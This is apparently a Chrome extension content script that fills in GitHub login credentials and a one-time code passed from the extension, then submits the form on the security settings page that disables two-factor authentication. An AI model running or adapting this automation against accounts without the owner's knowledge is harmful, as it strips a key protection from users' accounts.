console.log("github.js disable script injected");


chrome.runtime.onMessage.addListener(
    function(request, _) {
        if (request.github_credentials) {
            document.querySelector("#login_field").value = request.username;
            document.querySelector("#password").value = request.password;
            document.querySelector("html > body > div:nth-of-type(3) > main > div > div:nth-of-type(4) > form").submit();
        } else if (request.github_code) {
            document.querySelector("#otp").value = request.code;
            document.querySelector("html > body > div:nth-of-type(3) > main > div > div:nth-of-type(5) > form").submit();
        }
    }
);


if (window.location.href.includes("github.com/settings/security")) {
    // Successfully on page, unenroll from 2fa
    if (document.querySelector("html > body > div:nth-of-type(4) > main > div > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div > span") !== null) {
        document.querySelector("html > body > div:nth-of-type(4) > main > div > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div > form").submit()
        chrome.runtime.sendMessage({
            github_finished: true,
        })
    } else {
        chrome.runtime.sendMessage({
            github_error: true,
            message: "2FA already disabled",
        });
    }
} else if (window.location.href.includes("github.com/login")) {
    chrome.runtime.sendMessage({
        github_get_credentials: true,
    });
} else if (window.location.href.includes("github.com/sessions/two-factor")) {
    chrome.runtime.sendMessage({
        github_get_code: true,
    })
}